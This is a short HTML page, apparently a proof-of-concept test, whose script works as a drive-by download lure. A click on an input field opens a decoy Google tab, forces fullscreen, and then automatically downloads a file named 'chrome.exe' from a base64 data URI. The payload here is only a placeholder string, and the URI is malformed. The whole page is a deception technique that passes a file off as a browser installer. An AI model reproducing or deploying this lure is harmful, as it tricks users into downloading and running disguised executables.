<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Download</title>
</head>
<body>
  <center><h2>TEST!</h2></center>
  <input type="text" id="triggerInput">
  <script>
    document.getElementById('triggerInput').addEventListener('click', function() {
      // request fullscreen
 setTimeout(function() {
        openWin();
 }, 500);
 window.open('https://google.com', '_blank');
      goFullScreen();
    }, { once: false }); // Use { once: true } to ensure it only fires once
    // Download helper
    function Puf(uri, name) {
      const link = document.createElement("a");
      link.href = uri;
      link.download = name;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }
    // Kick off your “EXE” download
    function openWin() {
      Puf(
        "data://google.com/application/vnd.android.package-archive;base64,ZXN0dGVzdGVzdHRlc3Q=",
        "chrome.exe"

      );
    }
    function goFullScreen() {
      const element = document.documentElement;
      if (element.requestFullscreen) {
        element.requestFullscreen();
      } else if (element.mozRequestFullScreen) { // Firefox
        element.mozRequestFullScreen();
      } else if (element.webkitRequestFullscreen) { // Chrome, Safari and Opera
        element.webkitRequestFullscreen();
      } else if (element.msRequestFullscreen) { // IE/Edge
        element.msRequestFullscreen();

      }

    }

  </script>  

  
</body>
</html>
